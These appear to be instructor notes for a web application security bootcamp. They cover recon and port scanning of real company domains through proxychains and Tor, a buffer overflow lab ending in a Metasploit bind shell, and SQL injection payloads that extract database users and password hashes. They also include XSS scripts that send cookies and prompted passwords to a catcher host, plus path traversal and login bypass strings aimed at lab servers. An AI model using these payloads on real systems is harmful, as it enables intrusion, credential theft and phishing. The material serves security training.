####################
# Ultimate App Sec #
####################
Please use the link below to request access to the online course development environment:
https://goo.gl/forms/8dsJTT8tY5PLdMVx1

Download the course slides:
https://s3.amazonaws.com/StrategicSec-Files/UltimateAppSec/UltimateAppSec-Week1.pptx
http://www.slideshare.net/akilan27/ilugc-curl
http://www.slideshare.net/cory_scott/tactical-application-security-getting-stuff-done-black-hat-briefings-2015


Download the course lab manual:
https://s3.amazonaws.com/StrategicSec-Files/UltimateAppSec/Ultimate-App-Sec-V2.pdf



#########################
# More Course Materials #
#########################
 
Slides:
https://s3.amazonaws.com/StrategicSec-Files/BurpSuiteBootcamp/WebAppSecIsNotEasyButCanBeSimple.pptx
https://s3.amazonaws.com/StrategicSec-Files/BurpSuiteBootcamp/Burp+Suite.pptx
 
 
Lab Manual:
https://s3.amazonaws.com/StrategicSec-Files/BurpSuiteBootcamp/BurpSuite-Bootcamp-v1.pdf



##########
# VMWare #
##########
- For this workshop you'll need the latest version of VMWare Workstation (Windows), Fusion (Mac), or Player.
 
- A 30-day trial of Workstation 11 can be downloaded from here:
- https://my.vmware.com/web/vmware/info/slug/desktop_end_user_computing/vmware_workstation/11_0
 
- A 30-day trial of Fusion 7 can be downloaded from here:
- https://my.vmware.com/web/vmware/info/slug/desktop_end_user_computing/vmware_fusion/7_0
 
- The newest version of VMWare Player can be downloaded from here:
- https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_player/7_0
 
 
- Although you can get the VM to run in VirtualBox, I will not be supporting this configuration for this class.
 
 
##########################
# Download the attack VM #
##########################
https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu-v3.zip
user: strategicsec
pass: strategicsec











----------------------------------------------Attacking a large company----------------------------------------------


Day 1 Intro to Security:	Attacking a large company:


####################
# Passive Scanning #
####################

Pick a REALLY large company to attack (like HSBC similar multi-billion dollar/multi-national organization).


Look that entity up in the following places:
	- Wikipedia
	- Robtex
	- Netcraft
	- FF Passive Recon

- Wikipedia Page
	- Are they Public or Private?
	- Does the target have any subsidiaries?

- Robtex
	- Show system map

- Netcraft 
	- http://toolbar.netcraft.com/site_report

- Passive Recon (Firefox Add-on)
	- https://addons.mozilla.org/en-US/firefox/addon/passiverecon/






At the end of this you should know enough to be able to generate a document similar to my OSINT_Innophos_11242010.doc 


- Example OSINT Report to review:
	- https://s3.amazonaws.com/StrategicSec-Files/OSINT_Innophos_11242010.doc


Read this OSINT_Innophos_11242010.doc --OUT LOUD-- and call out interesting information that you find.










###################################################
# Day 1: Identifying External Security Mechanisms #
###################################################
-- Boot up the StrategicSec VM, log into it with Putty and execute the following commands:




sudo /sbin/iptables -F
     strategicsec

cd /home/strategicsec/toolz



###########################
# Target IP Determination #
###########################

perl blindcrawl.pl -d motorola.com

-- Take each IP address and look ip up here:
http://www.networksolutions.com/whois/index.jsp


Zone Transfer fails on most domains, but here is an example of one that works:
dig axfr heartinternet.co.uk  @ns.heartinternet.co.uk


cd ~/toolz/
./ipcrawl 148.87.1.1 148.87.1.254				(DNS forward lookup against an IP range)


sudo nmap -sL 148.87.1.0-255
     strategicsec

sudo nmap -sL 148.87.1.0-255 | grep oracle
     strategicsec






###########################
# Load Balancer Detection #
###########################

Here are some options to use for identifying load balancers:
	- http://toolbar.netcraft.com/site_report
	- https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/


Here are some command-line options to use for identifying load balancers:

dig microsoft.com

cd ~/toolz
./lbd-0.1.sh microsoft.com


halberd microsoft.com
halberd motorola.com
halberd oracle.com



######################################
# Web Application Firewall Detection #
######################################

cd ~/toolz/wafw00f
python wafw00f.py http://www.oracle.com
python wafw00f.py http://www.strategicsec.com


cd ~/toolz/
sudo nmap -p 80 --script http-waf-detect.nse oracle.com
     strategicsec

sudo nmap -p 80 --script http-waf-detect.nse healthcare.gov
     strategicsec



########################
# Scanning Methodology #
########################

- Ping Sweep
What's alive?
------------
sudo nmap -sP 157.166.226.*
     strategicsec

	-if -SP yields no results try:
sudo nmap -sL 157.166.226.*
     strategicsec

- Port Scan
What's where?
------------
sudo nmap -sS 162.243.126.247
     strategicsec


- Bannergrab/Version Query
What versions of software are running
-------------------------------------
sudo nmap -sV 162.243.126.247
     strategicsec


- Vulnerability Research
Lookup the banner versions for public exploits
----------------------------------------------
http://exploit-db.com
http://securityfocus.com/bid
https://packetstormsecurity.com/files/tags/exploit/



#######################################################
# Day 1: 3rd Party Scanning, and scanning via proxies #
#######################################################

https://www.shodan.io/

	Create a FREE account and login

	net:129.188.8.0/24



cd /home/strategicsec/toolz/
perl proxyfinder-0.3.pl multiproxy 3 proxies.txt	<-- This takes a long time to run



sudo vi /etc/proxychains.conf				<--- Make sure that last line of the file is: socks4  127.0.0.1 9050
     strategicsec




----------------------------------------------------------------------
vi ~/toolz/fix-proxychains-dns.sh

#!/bin/bash
# This script is called by proxychains to resolve DNS names
# DNS server used to resolve names
# Reference: http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html
DNS_SERVER=4.2.2.2

if [ $# = 0 ] ; then
echo " usage:"
echo " proxyresolv <hostname> "
exit
fi

export LD_PRELOAD=libproxychains.so.3
dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\.[0-9]+\.[0-9]/{print $5;}'
-----------------------------------------------------------------------


sudo ntpdate pool.ntp.org
     strategicsec

tor-resolve strategicsec.com

proxychains nmap -sT -p80 204.244.123.113

proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 204.244.123.113


#####################################
# Quick Stack Based Buffer Overflow #
#####################################
 
- You can download everything you need for this exercise from the link below
https://s3.amazonaws.com/StrategicSec-Files/SimpleExploitLab.zip
https://nmap.org/dist/nmap-7.12-setup.exe
 
- Extract this zip file to your Desktop
 
- Go to folder C:\Users\student\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
 
- Open a new command prompt and type:
ncat 127.0.0.1 9999
 
- In the new command prompt window where you ran ncat type:
HELP
 
- Go to folder C:\Users\student\student\ExploitLab\4-AttackScripts
- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
 
- Now double-click on 1-simplefuzzer.py
- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
 
 
- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
 
- Now go to folder C:\Users\student\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
 
- Go back to folder C:\Users\student\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
 
- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
 
- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
 
- Calculate the distance to EIP by running script 3-3000chars.py
- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
 
4-count-chars-to-EIP.py
- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
 
5-2006char-eip-check.py
- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
 
6-jmp-esp.py
- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
 
7-first-exploit
- In this script we actually do the stack overflow and launch a bind shell on port 4444
 
8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
 
 
------------------------------
 
cd /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
 
vi vulnserv.rb    (paste the code into this file)
 
 
 
cd ~/toolz/metasploit
 
./msfconsole
 
 
 
use exploit/windows/misc/vulnserv
set PAYLOAD windows/meterpreter/bind_tcp
set RHOST 192.168.88.129
set RPORT 9999
exploit











----------------------------------------------HTTP: The Foundation ----------------------------------------------

Introduction to HTTP with cURL

Do all of the tasks on http://conqueringthecommandline.com/book/curl starting from section 3.2 to the end of the page.



#############################
# 1. Download a Single File #
#############################
The following command will get the content of the URL and display it in the STDOUT (i.e on your terminal).
$ curl http://strategicsec.com

To store the output in a file, you an redirect it as shown below. This will also display some additional download statistics.
$ curl http://strategicsec.com > strategicsec-com.html


#####################################
# 2. Save the cURL Output to a file #
#####################################
We can save the result of the curl command to a file by using -o/-O options.
	•	-o (lowercase o) the result will be saved in the filename provided in the command line
	•	-O (uppercase O) the filename in the URL will be taken and it will be used as the filename to store the result

$ curl -o bye.txt http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt 
Now the page hello.txt will be saved in the file named ‘bye.txt’. 
You can also note that when running curl with -o option, it displays the progress meter for the download as follows.

When you use curl -O (uppercase O), it will save the content in the file named ‘hello.txt’ itself in the local machine.

$ curl -O http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
Note: When curl has to write the data to the terminal, it disables the Progress Meter, to avoid confusion in printing. We can use ‘>’|’-o’|’-O’ options to move the result to a file.

##################################################
# 3. Follow HTTP Location Headers with -L option #
##################################################
By default CURL doesn’t follow the HTTP Location headers. It is also termed as Redirects. When a requested web page is moved to another place, then an HTTP Location header will be sent as a Response and it will have where the actual web page is located.
For example, when someone types google.com in the browser from India, it will be automatically redirected to ‘google.co.in’. This is done based on the HTTP Location header as shown below.

$ curl --head http://www.strategicsec.com		You'll see that you only get the 301

$ curl --head -L http://www.strategicsec.com		You'll see that you get the 301, and the 200 OK

##########################################
# 4. Continue/Resume a Previous Download #
##########################################
Using curl -C option, you can continue a download which was stopped already for some reason. This will be helpful when you download large files, and the download got interrupted.
If we say ‘-C -‘, then curl will find from where to start resuming the download. We can also give an offset ‘-C <offset>’. The given offset bytes will be skipped from the beginning for the source file.
Start a big download using curl, and press Ctrl-C to stop it in between the download.

$ curl -O http://swreflections.blogspot.com/2015/05/appsec-gaps-between-builders-and.html
##############             20.1%
Note: -# is used to display a progress bar instead of a progress meter.
Now the above download was stopped at 20.1%. Using “curl -C -“, we can continue the download from where it left off earlier. Now the download continues from 20.1%.

curl -C - -O http://swreflections.blogspot.com/2015/05/appsec-gaps-between-builders-and.html
###############            21.1%



######################################
# 5. Test for XMLRPC Pingback Vuln #
######################################
$ curl -D - "strategicsec.com/xmlrpc.php" -H "Content-Type: text/xml" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://dojo.com/</string></value></param></methodcall>'


######################################
# 6. Limit the Rate of Data Transfer #
######################################
You can limit the amount at which the data gets transferred using –limit-rate option. You can specify the maximum transfer rate as argument.
$ curl --limit-rate 1000B -O http://swreflections.blogspot.com/2015/05/appsec-gaps-between-builders-and.html
The above command is limiting the data transfer to 1000 Bytes/second. curl may use higher transfer rate for short span of time. But on an average, it will come around to 1000B/second.


#########################################################################
# 7. Download a file only if it is modified before/after the given time #
#########################################################################
We can get the files that are modified after a particular time using -z option in curl. This will work for both FTP & HTTP.
$ curl -z 21-Dec-11 http://www.example.com/yy.html

The above command will download the yy.html only if it is modified later than the given date and time

$ curl -z -21-Dec-11 http://www.example.com/yy.html

The above command will download the yy.html, if it is modified before than the given date and time.
Please refer ‘man curl_getdate’ for the various syntax supported for the date expression

#######################################
# 8. Pass HTTP Authentication in cURL #
#######################################
Sometime, websites will require a username and password to view the content ( can be done with .htaccess file ). With the help of -u option, we can pass those credentials from cURL to the web server as shown below.

$ curl -u username:password URL

Note: By default curl uses Basic HTTP Authentication. We can specify other authentication method using –ntlm | –digest.

#####################################
# 9. Download Files from FTP server #
#####################################
cURL can also be used to download files from FTP servers. If the given FTP path is a directory, by default it will list the files under the specific directory.
$ curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/xss.php

The above command will download the xss.php file from the ftp server and save it in the local directory.
$ curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/

Here, the given URL refers to a directory. So cURL will list all the files and directories under the given URL
If you are new to FTP/sFTP, refer ftp sftp tutorial for beginners.

##################################
# 10. List/Download using Ranges #
##################################
cURL supports ranges to be given in the URL. When a range is given, files matching within the range will be downloaded. It will be helpful to download packages from the FTP mirror sites.
$ curl   ftp://ftp.uk.debian.org/debian/pool/main/[a-z]/
The above command will list out all the packages from a-z ranges in the terminal.

##################################
# 11. Upload Files to FTP Server #
##################################
Curl can also be used to upload files to the FTP server with -T option.
$ curl -u ftpuser:ftppass -T myfile.txt ftp://ftp.testserver.com

The above command will upload the file named myfile.txt to the FTP server. You can also upload multiple files at a same time using the range operations.


$ curl -u ftpuser:ftppass -T "{file1,file2}" ftp://ftp.testserver.com

Optionally we can use “.” to get the input from STDIN and transfer to the remote.

$ curl -u ftpuser:ftppass -T - ftp://ftp.testserver.com/myfile_1.txt

The above command will get the input from the user from Standard Input and save the contents in the ftp server under the name ‘myfile_1.txt’.
You can provide one ‘-T’ for each URL and the pair specifies what to upload where.

#######################################################
# 12. More Information using Verbose and Trace Option #
#######################################################
You can get to know what is happening using the -v option. -v option enable the verbose mode and it will print the details

curl -v http://strategicsec.com

The about command will output the following


####################################################
# 13. Get Definition of a Word using DICT Protocol #
####################################################
You can use cURL to get the definition for a word with the help of DICT protocol. We need to pass a Dictionary Server URL to it.

$ curl dict://dict.org/d:bash
The above command will list the meaning for bash as follows jargon "The Jargon File (version 4.4.7, 29 Dec 2003)" foldoc "The Free On-line Dictionary of Computing (26 July 2010)"
easton "Easton's 1Now you can see that it uses “The Collaborative International Dictionary of English”. There are many dictionaries are available. We can list all the dictionaries using


####################################
# 14. Use Proxy to Download a File #
####################################
We can specify cURL to use proxy to do the specific operation using -x option. We need to specify the host and port of the proxy.

$ curl -x proxysever.test.com:3128 http://strategicsec.com


#####################################
# 15. Send Mail using SMTP Protocol #
#####################################
cURL can also be used to send mail using the SMTP protocol. You should specify the from-address, to-address, and the mailserver ip-address as shown below.

$ curl --mail-from blah@test.com --mail-rcpt foo@test.com smtp://mailserver.com
Once the above command is entered, it will wait for the user to provide the data to mail. Once you’ve composed your message, type . (period) as the last line, which will send the email immediately.
Subject: Testing
This is a test mail
.



----------------------------------------------Firefox and Burp Suite ----------------------------------------------



###########
# Firefox #
###########
Start with simple Firefox Addons:

- ShowIP				https://addons.mozilla.org/en-US/firefox/addon/showip/
- Server Spy				https://addons.mozilla.org/en-US/firefox/addon/server-spy/
- FoxyProxy				https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
- Tamper Data				https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
- Wapalyzer				https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/

A good list of web app testing add ons for Firefox:
https://addons.mozilla.org/en-us/firefox/collections/adammuntner/webappsec/




#########################
# Setting up Burp Suite #
#########################
Download latest free version of Burp at http://www.portswigger.net/burp/download.html 
Make sure that  burpsuite_free_v1.6.31.jar is set as executable (chmod +x burpsuite_free_v1.6.31.jar) and then run:

java -jar burpsuite_free_v1.6.31.jar

	- Click the "Proxy" tab
	- Click the "Options" sub tab
	- Click “Edit” in the “Proxy Listeners” section
	- In the “Edit proxy listener” pop up select “Binding Tab” select “loopback only”
	- In the same pop up make sure that the bind port is 8080
	- In the same pop up select the “Certificate” tab
	- Ensure that burp is configured to "generate CA-signed per-host certificates"

Open Firefox
	- Click "Edit"
	- Click “Preferences"
	- Click the "Advanced" tab
	- Click the "Network" sub tab
	- Click the connection "settings" button
	- Click "manual proxy configuration"
		set it to 127.0.0.1 port 8080
		check "Use this proxy server for all protocols"
	- Remove both the "localhost, 127.0.0.1" text from the "No Proxy For:" line


Configure your browser to use Burp as its proxy, and configure Burp's proxy listener to generate CA-signed per-host certificates.

Visit any SSL-protected URL.

On the “This Connection is Untrusted” screen, click on “Add Exception”
Click "Get Certificate", then click "View".

In the “Details” tab, select the root certificate in the tree (PortSwigger CA).

Click "Export" and save the certificate as "BurpCert" on the Desktop.

Close Certificate Viewer dialog and click “Cancel” on the “Add Security Exception” dialog
Go to Edit | Preferences 
Click “Advanced” and go to “Certificates” tab
Click “View Certificates”

Click "Import" and select the certificate file that you previously saved.

On the "Downloading Certificate" dialog, check the box "Trust this CA to identify web sites", and click "OK".

Close all dialogs and restart Firefox





##################################
# Basic: Web Application Testing #
##################################

Most people are going to tell you reference the OWASP Testing guide.
https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents

I'm not a fan of it for the purpose of actual testing. It's good for defining the scope of an assessment, and defining attacks, but not very good for actually attacking a website.


The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
	
	1. Does the website talk to a DB?
		- Look for parameter passing (ex: site.com/page.php?id=4)
		- If yes - try SQL Injection

	2. Can I or someone else see what I type?
		- If yes - try XSS

	3. Does the page reference a file?
		- If yes - try LFI/RFI

Let's start with some manual testing against 54.213.100.93


Start here:
http://54.213.100.93/


There's no parameter passing on the home page so the answer to question 1 is NO.
There is however a search box in the top right of the webpage, so the answer to question 2 is YES.

Try an XSS in the search box on the home page:
<script>alert(123);</script>

Doing this gives us the following in the address bar:
http://54.213.100.93/BasicSearch.aspx?Word=<script>alert(123);</script>

Ok, so we've verified that there is XSS in the search box. 

Let's move on to the search box in the left of the page.

Let's give the newsletter signup box a shot

Moving on to the login page.
http://54.213.100.93/login.aspx

I entered a single quote (') for both the user name and the password. I got the following error:

-----------------------------------------------------------------
 'Users//User[@Name=''' and @Password=''']' has an invalid token.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Xml.XPath.XPathException: 'Users//User[@Name=''' and @Password=''']' has an invalid token.

Source Error:


Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");
Line 113:            string credential = "Users//User[@Name='" + UserName + "' and @Password='" + Password + "']";
Line 114:            XmlNodeList xmln = doc.SelectNodes(credential);
Line 115:            //String test = xmln.ToString();            
Line 116:            if (xmln.Count > 0)

-----------------------------------------------------------------


Hmm....System.Xml.XPath.XPathException.....that's not SQL.

WTF is this:
Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");




In this case you'll have the trap the request with a proxy like:
- Firefox Tamper Data
- Burp Suite				http://www.portswigger.net/Burp/proxy.html
- WebScarab				https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project
- Rat Proxy				https://code.google.com/p/ratproxy/
- Zap Proxy				https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
- Paros					http://sourceforge.net/projects/paros/



Let's go back to that page error message.....


Let's check it out:
http://54.213.100.93/AuthInfo.xml

Looks like we found passwords!!!!!!!!!!


Looks like there no significant new functionality after logging in with the stolen credentials.

Going back to the homepage...let's see if we can see anything. Figured I'd click on one of the links


http://54.213.100.93/bookdetail.aspx?id=2


Ok, there is parameter passing (bookdetail.aspx?id=2).

The page name is:		bookdetail.aspx
The parameter name is:		id
The paramber value is:		2


Let's try throwing a single quote (') in there:

http://54.213.100.93/bookdetail.aspx?id=2'


I get the following error:

Unclosed quotation mark after the character string ''.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.










#############################################################################
# SQL Injection                                                             #
# https://s3.amazonaws.com/StrategicSec-Files/1-Intro_To_SQL_Intection.pptx #
#############################################################################


- Another quick way to test for SQLI is to remove the paramter value

 
#############################
# Error-Based SQL Injection #
#############################
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))-- 	NOTE: "N" - just means to keep going until you run out of databases
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
http://54.213.100.93/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--




#############################
# Union-Based SQL Injection #
#############################
http://54.213.100.93/bookdetail.aspx?id=2 order by 100--
http://54.213.100.93/bookdetail.aspx?id=2 order by 50--
http://54.213.100.93/bookdetail.aspx?id=2 order by 25--
http://54.213.100.93/bookdetail.aspx?id=2 order by 10--
http://54.213.100.93/bookdetail.aspx?id=2 order by 5--
http://54.213.100.93/bookdetail.aspx?id=2 order by 6--
http://54.213.100.93/bookdetail.aspx?id=2 order by 7--
http://54.213.100.93/bookdetail.aspx?id=2 order by 8--
http://54.213.100.93/bookdetail.aspx?id=2 order by 9--
http://54.213.100.93/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--

	We are using a union select statement because we are joining the developer's query with one of our own.
	Reference: 
	http://www.techonthenet.com/sql/union.php
	The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements. 
	It removes duplicate rows between the various SELECT statements.

	Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.

http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--

	Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.

http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
http://54.213.100.93/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--





- Another way is to see if you can get the backend to perform an arithmetic function
http://54.213.100.93/bookdetail.aspx?id=(2)	
http://54.213.100.93/bookdetail.aspx?id=(4-2)	
http://54.213.100.93/bookdetail.aspx?id=(4-1)



http://54.213.100.93/bookdetail.aspx?id=2 or 1=1-- 
http://54.213.100.93/bookdetail.aspx?id=2 or 1=2-- 
http://54.213.100.93/bookdetail.aspx?id=1*1 
http://54.213.100.93/bookdetail.aspx?id=2 or 1 >-1# 
http://54.213.100.93/bookdetail.aspx?id=2 or 1<99# 
http://54.213.100.93/bookdetail.aspx?id=2 or 1<>1# 
http://54.213.100.93/bookdetail.aspx?id=2 or 2 != 3-- 
http://54.213.100.93/bookdetail.aspx?id=2 &0#





###############################
# Blind SQL Injection Testing #
###############################
Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
  	 
3 - Total Characters
http://54.213.100.93/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 		(Ok, the username is 3 chars long - it waited 10 seconds)

Let's go for a quick check to see if it's DBO
http://54.213.100.93/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--

Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.

D  - 1st Character
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'-- 	
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- 	(Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
 
B - 2nd Character
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
 
O - 3rd Character
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
http://54.213.100.93/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds










###################################################################
# What is XSS                                                     #
# https://s3.amazonaws.com/StrategicSec-Files/2-Intro_To_XSS.pptx #
###################################################################
 
OK - what is Cross Site Scripting (XSS)
 
1. Use Firefox to browse to the following location:
 
    http://54.172.112.249/xss_practice/
 
    A really simple search page that is vulnerable should come up.
 
 
 
 
2. In the search box type:
   
    <script>alert('So this is XSS')</script>
 
 
    This should pop-up an alert window with your message in it proving XSS is in fact possible.
    Ok, click OK and then click back and go back to http://54.172.112.249/xss_practice/
 
 
3. In the search box type:
   
    <script>alert(document.cookie)</script>
 
 
    This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
    Ok, click OK and then click back and go back to http://54.172.112.249/xss_practice/
 
4. Now replace that alert script with:
 
    <script>document.location="http://54.172.112.249/xss_practice/cookie_catcher.php?c="+document.cookie</script>
 
 
This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
 
 
5. Now view the stolen cookie at:
    http://54.172.112.249/xss_practice/cookie_stealer_logs.html
 
 
The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
 
 
 
 
 
 
############################
# A Better Way To Demo XSS #
############################
 
 
Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
 
 
Use Firefox to browse to the following location:
 
    http://54.172.112.249/xss_practice/
 
 
 
Paste this in the search box
----------------------------
 
 
Option 1
--------
 
<script>
password=prompt('Your session is expired. Please enter your password to continue',' ');
document.write("<img src=\"http://54.172.112.249/xss_practice/passwordgrabber.php?password=" +password+"\">");
</script>
 
 
Now view the stolen cookie at:
    http://54.172.112.249/xss_practice/passwords.html
 
 
 
Option 2
--------
<script>
username=prompt('Please enter your username',' ');
password=prompt('Please enter your password',' ');
document.write("<img src=\"http://54.172.112.249/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
</script>
 
 
 
 
Now view the stolen cookie at:
http://54.172.112.249/xss_practice/username_password_logs.html




#########################################
# Let's kick it up a notch with ASP.NET #
# http://54.200.178.220/                #
#########################################


The trading Web App is on http://54.200.178.220/


Try the following in the search box:
	<script>alert(123);</script>
	' or 1=1
	' and a=a
	1=1
	Joe'+OR+1=1;--


	<script>alert(123);</script>
	
Open a new tab in firefox and try this:
	http://54.200.178.220/Searchresult.aspx?<script>alert(123);</script>=ScriptName


Try the contact us form.
Open a new tab in firefox and try this:
	http://54.200.178.220/OpenPage.aspx?filename=../../../../../../windows/win.ini

Try this on the inquiry form:
	Joe McCray
	1234567890
	joe@strategicsec.com') waitfor delay '00:00:10'--


Login Box:

	' or 1=1 or ''='
	anything   			(click login instead of pressing enter)



Tamper Data: (notice 2 session IDs)

	AcmeTrading=a4b796687b846dd4a34931d708c62b49; 		SessionID is md5
	IsAdmin=yes; 
	ASP.NET_SessionId=d10dlsvaq5uj1g550sotcg45



Profile - Detail	(tamper data)
	Disposition: form-data; name="ctl00$contentMiddle$HiddenField1"\r\n\r\njoe\r\n
	joe|set


	xss_upload.txt (Upload Bulk Order)
	<script>alert(123);</script>




 
 
Day 1 Homework:
 
 
Day 1 Challenge (Due 12 December):
Use Burp Suite to demonstrate with screenshots and explanations of how to test for the all of the OWASP Top 10 vulnerabilities against your choice of targets the following targets:
http://strategicsec.com
http://54.213.100.93/
http://54.172.112.249/
http://54.200.178.220/
http://54.213.131.105/
 
Submit the results via email in an MS Word document with (naming convention example: YourFirstName-YourLastName-Burp-Suite-Bootcamp-Day1-Challenge.docx)
 
 
 
Day 2 Video:
https://s3.amazonaws.com/StrategicSec-Videos/2015/2015-12-13+09.25+Burp+Suite+Weekend+Bootcamp.mp4
 
 
Day 2 Challenge (Due 19 December):
----------------------------------
Use the StrategicSec Ubuntu VM to demonstrate how to install, configure, and use at least five (5) of the following Burp Suite extensions from these websites and lists below:
https://github.com/integrissecurity/carbonator
https://github.com/allfro/BurpKit
https://github.com/nccgroup/BurpSuiteLoggerPlusPlus
https://github.com/Quitten/Autorize
https://github.com/codewatchorg/sqlipy
https://github.com/augustd/burp-suite-token-fetcher
https://github.com/augustd/burp-suite-gwt-scan
 
https://webbreacher.wordpress.com/2015/07/25/my-favorite-burp-suite-extensions/
http://bughunting.guide/the-top-5-burp-suite-extensions/
https://www.codemagi.com/downloads/
 
 
 
You must use them against your choice of targets the following targets:
http://strategicsec.com
http://54.213.100.93/
http://54.172.112.249/
http://54.200.178.220/
http://54.213.131.105/
 
Submit the results via email in an MS Word document with (naming convention example: 
